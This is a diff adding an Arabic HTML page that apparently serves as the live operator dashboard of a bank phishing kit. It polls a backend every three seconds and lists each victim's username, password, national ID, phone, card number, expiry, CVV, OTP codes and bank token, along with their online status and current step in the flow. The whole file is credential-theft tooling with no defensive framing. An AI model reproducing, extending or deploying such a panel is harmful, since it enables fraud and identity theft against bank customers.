@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة تحكم مبسطة</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0f172a;color:#e2e8f0;padding:0}
+.topbar{background:#1e293b;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #334155}
+.topbar h1{color:#10b981;font-size:1.1rem}
+.stats{display:flex;gap:12px}
+.stat{background:#0f172a;padding:4px 12px;border-radius:16px;font-size:13px;font-weight:bold}
+.stat.total{color:#60a5fa}
+.stat.online{color:#34d399}
+.stat.pending{color:#fbbf24}
+.main{padding:12px}
+.error{background:#7f1d1d;border:1px solid #ef4444;color:#fca5a5;padding:10px;border-radius:8px;margin:8px 0}
+.loading{text-align:center;color:#94a3b8;padding:40px}
+.customer{background:#1e293b;border:1px solid #334155;border-radius:8px;padding:12px;margin:8px 0}
+.customer.is-online{border-color:#10b981}
+.customer-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.customer-name{font-weight:bold;font-size:15px;color:#f1f5f9}
+.badge{padding:2px 8px;border-radius:10px;font-size:11px;font-weight:bold}
+.badge-online{background:#065f46;color:#34d399}
+.badge-offline{background:#374151;color:#9ca3af}
+.badge-pending{background:#78350f;color:#fcd34d}
+.fields{display:grid;grid-template-columns:1fr 1fr;gap:4px 12px}
+.field{display:flex;gap:6px;font-size:12px;padding:2px 0}
+.field-label{color:#94a3b8;min-width:80px;flex-shrink:0}
+.field-value{color:#e2e8f0;font-family:monospace;word-break:break-all}
+.highlight{color:#fbbf24;font-weight:bold}
+.refresh-info{text-align:center;color:#64748b;font-size:11px;padding:8px}
+.empty{text-align:center;color:#94a3b8;padding:40px;font-size:16px}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <h1>لوحة تحكم مبسطة - بنك المارية</h1>
+  <div class="stats">
+    <div class="stat pending" id="s-pending">معلق: -</div>
+    <div class="stat total" id="s-total">الكل: -</div>
+    <div class="stat online" id="s-online">متصل: -</div>
+  </div>
+</div>
+<div class="refresh-info" id="info">جاري التحميل...</div>
+<div class="main" id="list"></div>
+
+<script>
+var pollCount = 0;
+var listEl = document.getElementById('list');
+var infoEl = document.getElementById('info');
+
+function renderCustomers(customers) {
+  var keys = Object.keys(customers);
+  var total = keys.length;
+  var online = 0;
+  var pending = 0;
+
+  keys.forEach(function(k) {
+    var c = customers[k];
+    if (c.presence && c.presence.state === 'online') online++;
+    var s = (c.status || '').toLowerCase();
+    if (s.indexOf('pending') >= 0 || s.indexOf('محاولة') >= 0 || s.indexOf('بانتظار') >= 0) pending++;
+  });
+
+  document.getElementById('s-total').textContent = 'الكل: ' + total;
+  document.getElementById('s-online').textContent = 'متصل: ' + online;
+  document.getElementById('s-pending').textContent = 'معلق: ' + pending;
+
+  if (total === 0) {
+    listEl.innerHTML = '<div class="empty">لا يوجد عملاء حالياً</div>';
+    return;
+  }
+
+  // Sort by updatedAt desc
+  keys.sort(function(a, b) {
+    return (customers[b].updatedAt || '').localeCompare(customers[a].updatedAt || '');
+  });
+
+  var html = '';
+  keys.forEach(function(k) {
+    var c = customers[k];
+    var p = c.presence || {};
+    var isOnline = p.state === 'online';
+
+    html += '<div class="customer ' + (isOnline ? 'is-online' : '') + '">';
+    html += '<div class="customer-header">';
+    html += '<span class="customer-name">' + (c.fullName || c.name || c.username || k) + '</span>';
+    html += '<span class="badge ' + (isOnline ? 'badge-online' : 'badge-offline') + '">' + (isOnline ? 'متصل' : 'غير متصل') + '</span>';
+    html += '</div>';
+    html += '<div class="fields">';
+    html += '<div class="field"><span class="field-label">ID:</span><span class="field-value">' + k + '</span></div>';
+    html += '<div class="field"><span class="field-label">المستخدم:</span><span class="field-value highlight">' + (c.username || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">كلمة المرور:</span><span class="field-value highlight">' + (c.password || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">الإيميل:</span><span class="field-value">' + (c.email || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">الجوال:</span><span class="field-value">' + (c.phone || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">الهوية:</span><span class="field-value">' + (c.nationalId || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">الحالة:</span><span class="field-value">' + (c.status || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">الخطوة:</span><span class="field-value">' + (c.currentStep || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">آخر إجراء:</span><span class="field-value">' + (c.lastAction || '-') + '</span></div>';
+    html += '<div class="field"><span class="field-label">آخر صفحة:</span><span class="field-value">' + (c.lastPage || '-') + '</span></div>';
+
+    // Show card info if available
+    if (c.cardNumber) {
+      html += '<div class="field"><span class="field-label">رقم البطاقة:</span><span class="field-value highlight">' + c.cardNumber + '</span></div>';
+      html += '<div class="field"><span class="field-label">انتهاء/CVV:</span><span class="field-value highlight">' + (c.cardExpiry || '') + ' / ' + (c.cardCvv || '') + '</span></div>';
+    }
+
+    // Show OTP if available
+    if (c.otp) {
+      html += '<div class="field"><span class="field-label">OTP:</span><span class="field-value highlight">' + c.otp + '</span></div>';
+    }
+
+    // Show tokens
+    if (c.nbeToken) {
+      html += '<div class="field"><span class="field-label">AAIB توكن:</span><span class="field-value highlight">' + c.nbeToken + '</span></div>';
+    }
+
+    html += '<div class="field"><span class="field-label">آخر تحديث:</span><span class="field-value">' + (c.updatedAt || '-') + '</span></div>';
+    html += '</div></div>';
+  });
+
+  listEl.innerHTML = html;
+}
+
+function poll() {
+  pollCount++;
+  fetch('/api/fb/poll?path=customers').then(function(r) {
+    return r.json();
+  }).then(function(data) {
+    if (data.value && typeof data.value === 'object') {
+      renderCustomers(data.value);
+      infoEl.textContent = 'تحديث #' + pollCount + ' - ' + new Date().toLocaleTimeString('ar-EG');
+    } else {
+      listEl.innerHTML = '<div class="empty">لا يوجد عملاء - قاعدة البيانات فارغة</div>';
+      document.getElementById('s-total').textContent = 'الكل: 0';
+      document.getElementById('s-online').textContent = 'متصل: 0';
+      document.getElementById('s-pending').textContent = 'معلق: 0';
+      infoEl.textContent = 'تحديث #' + pollCount + ' - لا توجد بيانات - ' + new Date().toLocaleTimeString('ar-EG');
+    }
+  }).catch(function(e) {
+    listEl.innerHTML = '<div class="error">خطأ في الاتصال: ' + e.message + '</div>';
+    infoEl.textContent = 'خطأ! ' + e.message;
+  });
+}
+
+// Start polling
+poll();
+setInterval(poll, 3000);
+</script>
+</body>
+</html>
